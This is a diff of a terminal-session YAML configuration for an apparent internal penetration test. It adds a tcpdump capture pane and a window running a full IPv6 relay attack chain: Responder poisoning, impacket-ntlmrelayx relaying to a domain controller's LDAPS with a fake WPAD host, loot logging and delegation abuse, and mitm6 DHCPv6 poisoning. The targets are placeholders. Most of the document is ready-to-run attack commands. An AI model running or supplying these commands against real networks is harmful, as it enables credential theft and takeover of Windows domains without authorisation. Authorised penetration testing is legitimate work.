@@ -26,16 +26,16 @@ windows:
             echo $? > nmap_full_exit.txt
 
 
-  - window_name: Responder
+  - window_name: PCAP_Capture
     panes:
       - shell_command:
           - >-
-            cd ~/pentest2026/amin/Responder &&
-            mkdir -p responder_logs &&
-            sudo -S script -q responder_logs/session.log -c 'responder -I eth0 --lm --disable-ess --basic -PF';
-            echo $? > responder_logs/exit.txt
-            
-            
+            cd ~/pentest2026/ &&
+            mkdir -p captures &&
+            sudo -S timeout 1800 tcpdump -i eth0 -w captures/capture.pcap;
+            echo $? > captures/exit.txt
+
+
   - window_name: SMB_Anon
     panes:
       - shell_command:
@@ -96,3 +96,29 @@ windows:
             };
             if [ -f snaffler.db ]; then mv snaffler.db run_logs/snaffler.db;
             else echo 'DB missing' >> run_logs/output.log; fi
+
+
+  - window_name: IPv6_LLMNR_Relay
+    layout: tiled
+    panes:
+      - shell_command:
+          - >-
+            cd ~/pentest2026/{NAME}/Responder &&
+            mkdir -p responder_logs &&
+            sudo -S sed -i -e 's/^HTTP[[:space:]]*=.*/HTTP = Off/' -e 's/^HTTPS[[:space:]]*=.*/HTTPS = Off/' -e 's/^SMB[[:space:]]*=.*/SMB = Off/' /etc/responder/Responder.conf &&
+            sudo -S script -q responder_logs/session.log -c 'responder -I eth0 --lm --disable-ess --basic';
+            echo $? > responder_logs/exit.txt
+
+      - shell_command:
+          - >-
+            cd ~/pentest2026/{NAME}/ntlmrelayx &&
+            mkdir -p relay_logs &&
+            sudo -S script -q relay_logs/session.log -c 'impacket-ntlmrelayx -6 -t ldaps://{DC_IP} -wh fakewpad.{DOMAIN} -socks -l relay_logs/loot --delegate-access';
+            echo $? > relay_logs/exit.txt
+
+      - shell_command:
+          - >-
+            cd ~/pentest2026/{NAME}/mitm6 &&
+            mkdir -p mitm6_logs &&
+            sudo -S script -q mitm6_logs/session.log -c 'mitm6 -d {DOMAIN} --ignore-nofqdn';
+            echo $? > mitm6_logs/exit.txt
